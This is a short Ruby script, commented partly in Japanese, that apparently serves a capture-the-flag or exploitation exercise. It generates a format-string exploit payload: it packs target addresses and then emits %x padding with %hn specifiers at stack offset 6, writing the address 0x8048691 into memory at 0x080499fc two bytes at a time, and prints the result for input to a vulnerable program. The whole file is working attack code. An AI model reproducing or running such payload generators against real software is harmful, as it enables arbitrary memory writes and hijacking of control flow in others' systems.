#!/usr/bin/env ruby
require 'pry'

def pack(hex_str)
  [hex_str].pack('V')
end

def unpack(hex_str)
  hex_str.unpack('V')[0]
end

data_value = 0x8048691    # data to be written
dest = 0x080499fc   # destination base
pos = 6             # スタックの位置

# 下位から書き込むために分割&reverse
data    = data_value.to_s(16).reverse.scan(/.{1,4}/).map{|s| s.reverse.to_i(16)}
stage   = data.size # 分割数
dests   = stage.times.map{|i| pack(dest+0x2*i)}
value   = dests.map(&:size).inject(&:+)
values  = data.unshift(value).each_cons(2).map{|val,num| (num-val)%0x10000}
payload = values.map.with_index{|v,i| "%#{v}x%#{pos+i}$hn"}.inject(&:+)

warn "dests #{dests.map{|n| unpack(n).to_s(16)}}"
warn "values #{values}"
warn "payload \"#{payload}\""

print dests.inject(&:+) + payload
